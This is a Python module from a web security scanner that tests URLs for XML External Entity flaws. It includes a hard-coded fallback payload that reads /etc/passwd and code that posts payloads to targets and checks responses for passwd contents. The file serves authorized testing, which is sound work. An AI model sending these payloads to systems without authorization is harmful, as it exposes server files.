
"""
src/scanners/xxe_scanner.py

Detects XML External Entity (XXE) vulnerabilities.

⚠️ LEGAL DISCLAIMER ⚠️
This tool is for EDUCATIONAL and AUTHORIZED testing only.
Please ensure you have explicit permission before scanning any target.
The authors assume NO LIABILITY for misuse, damage, or legal consequences.
"""

import logging
from typing import List, Dict, Any
from src.core.requester import Requester

logger = logging.getLogger(__name__)

class XXEScanner:
    """
    Scans for XML External Entity (XXE) vulnerabilities.
    """
    def __init__(self, requester: Requester):
        self.requester = requester
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> List[str]:
        """
        Loads XXE payloads from the payloads/xxe/payloads.txt file.
        """
        payload_file = "payloads/xxe/payloads.txt"
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"XXE payload file not found: {payload_file}")
            return ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"] # Default payload

    async def scan(self, url: str, data: str = None) -> List[Dict[str, Any]]:
        """
        Scans a given URL for XXE vulnerabilities, typically in POST data.
        """
        findings = []
        logger.info(f"Scanning {url} for XXE...")

        if data: # Assuming data is XML content
            for payload in self.payloads:
                test_data = payload.replace("&xxe;", "&xxe;" + data) if "&xxe;" in payload else payload + data
                response = await self.requester.post(url, content=test_data, headers={'Content-Type': 'application/xml'})
                if response and ("root:x:0:0" in response.text or "daemon:x:1:1" in response.text): # Example detection
                    findings.append({
                        "type": "XML External Entity",
                        "severity": "High",
                        "cvss_score": 7.5, # Example CVSS score
                        "url": url,
                        "payload": payload,
                        "evidence": f"System file content detected with XXE payload.",
                        "remediation": "Disable DTDs and external entity processing in XML parsers."
                    })
                    logger.warning(f"XXE finding in {url} with payload {payload}")

        return findings
